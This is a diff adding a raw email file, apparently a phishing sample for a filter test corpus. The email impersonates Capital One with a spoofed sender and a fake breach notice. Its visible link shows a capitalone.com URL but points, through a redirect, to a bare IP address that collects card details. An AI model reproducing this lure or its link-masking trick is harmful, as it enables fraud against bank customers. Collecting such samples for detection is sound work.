@@ -1,0 +1,58 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <servicecenter@capitalone.us>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 2CB4246924
+ for <user@login.example.com>; Fri,  4 May 2007 16:50:07 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id 4B66D131FA0D
+ for <user@example.com>; Fri,  4 May 2007 16:50:07 -0400 (EDT)
+Received: from zawidow.com (unknown [82.177.174.2])
+ by mail.example.org (Postfix) with ESMTP id B84B36FA1C7
+ for <user@example.com>; Fri,  4 May 2007 16:50:06 -0400 (EDT)
+Received: from User (adsl-75-17-72-225.dsl.bcvloh.sbcglobal.net [75.17.72.225])
+ by zawidow.com (Postfix) with ESMTP id 2D8015CFEA3;
+ Fri,  4 May 2007 22:46:01 +0200 (CEST)
+From: "Capital One"<servicecenter@capitalone.us>
+Subject: Capital One Unauthorized access to processing centre detected
+Date: Fri, 4 May 2007 16:45:25 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20070504204601.2D8015CFEA3@zawidow.com>
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 1213
+
+<html><head>
+  <meta content="text/html;charset=iso-8859-1" http-equiv="Content-Type">
+  <title>Capital One: Unauthorized access to processing centre detected.</title></head><body bgcolor="#ffffff" text="#000000"><body style="background-color: #fffff; margin: 0; padding: 0"><table border="0" cellpadding="0" cellspacing="0" width="774"> <tr valign="top"> 
+         <td><img name="caponelogo"src="https://service.capitalone.com/images/oas/caponelogo.gif"width="320" height="81" border="0"></td>         <td>                     <table border="0"background="https://service.capitalone.com/images/oas/headercolor.jpg"height="81" width="454" cellpadding="0" cellspacing="0">
+                  <tr>
+                     <td valign="top" align="right">&nbsp;</td>
+                 </tr>
+             </table>
+         </td>
+   </tr></table><table width="774" style="background-color:#fffffd; border-top: 5pxsolid #006666; border-bottom: 3px solid #006666"><tr><td style="padding: 10px; FONT-FAMILY: Helvetica, Verdana,sans-serif; font-size: 12px;" colspan="2"><h3>Dear customer!</h3>According to international security requirements of
+ Visa and MasterCard payment systems, we have to inform you about the following notice:
+<br><br>First of May 2007, security department of our bank marked anunauthorized access to our processing
+ server centre, and intruderstook control over all credit cards.<br><br>After close inspection, we learned that
+ intruders would be able tochange your credit cards data for their needs and use them in illegaloperations.
+  We have found a way to secure you against fraudulentactions.
+<br><br>You need to visit our site and input your authentic data, which willbe verified with existent information.
+ If the data would not match –we will contact you for re-issue of your card. Using these security measures, we will prevent fraudsters from getting access to your card.
+<br><br><a href="http://rds.yahoo.com/_ylt=A0oGkkc89eREaekARGxXNyoA;_ylu=X3oDMTB2cXVjNTM5BGNvbG8DdwRsA1dTMQRwb3MDMQRzZWMDc3IEdnRpZAM-/SIG=12cpokol2/EXP=1155942076/**http://70.158.198.34/service.capitalone.com.oas.login.do.objectclicked.loginsplash.html">https://service.capitalone.com/oas/login.do?objectclicked=LoginSplash</a><br><br>We ask you
+ to approach this notice with responsibility, because thatis the one way to keep all your money safe. We require being attentive with this information.<br><br>Security Department<br>of Processing Centre,<br>Capital One Bank.</td></tr></table>
+<span style="padding: 10px;  FONT-FAMILY: Helvetica, Verdana,sans-serif; font-size: 11px;">Capital One Bank, Capital One, F.S.B., members FDIC. &copy;2007Capital One Services, Inc.</span><br>
+<span style="padding: 10px;  FONT-FAMILY: Helvetica, Verdana,sans-serif; font-size: 11px;">Capital One is a federally registered service mark. All rights reserved.
+</span>
+</body>
+</html> 
